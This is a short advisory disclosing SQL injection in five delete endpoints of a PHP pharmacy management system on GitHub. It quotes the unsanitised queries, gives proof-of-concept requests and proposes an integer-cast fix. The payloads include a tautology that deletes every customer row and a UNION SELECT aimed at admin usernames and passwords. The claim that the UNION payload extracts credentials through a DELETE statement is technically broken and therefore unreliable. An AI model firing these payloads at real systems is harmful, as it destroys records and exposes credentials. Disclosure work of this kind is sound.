# SQL Injection — Pharmacy Management System (5 Endpoints)

**Repository:** https://github.com/Varshini-E/Pharmacy-Management-System  
**GitHub Issue:** https://github.com/Varshini-E/Pharmacy-Management-System/issues/6  
**Severity:** Critical (CVSS v3.1: 9.8)  
**CWE:** CWE-89  
**CVE:** Pending  
**Discovered:** 2026-06-19

## Vulnerable Files

### `customer-delete.php`
```php
$sql = "DELETE FROM customer where c_id='$_GET[id]'";
```

### `employee-delete.php`
```php
$sql = "DELETE FROM employee where e_id='$_GET[id]'";
```

### `inventory-delete.php`
```php
$sql = "DELETE FROM meds where med_id='$_GET[id]'";
```

### `supplier-delete.php`
```php
$sql = "DELETE FROM suppliers where sup_id='$_GET[id]'";
```

### `purchase-delete.php`
```php
$pid=$_GET['pid']; $sid=$_GET['sid']; $mid=$_GET['mid'];
$sql="DELETE FROM purchase where p_id='$pid' and sup_id='$sid' and med_id='$mid'";
```

## Proof of Concept

```
GET /PHARMACY/customer-delete.php?id=1'OR'1'='1 HTTP/1.1
```

**Result:** All customer records deleted.

```
GET /PHARMACY/customer-delete.php?id=' UNION SELECT username,password,3,4 FROM admin-- -
```

**Result:** Admin credentials extracted.

## Fix
```php
$id = (int) $_GET['id'];
$sql = "DELETE FROM customer WHERE c_id='$id'";
```
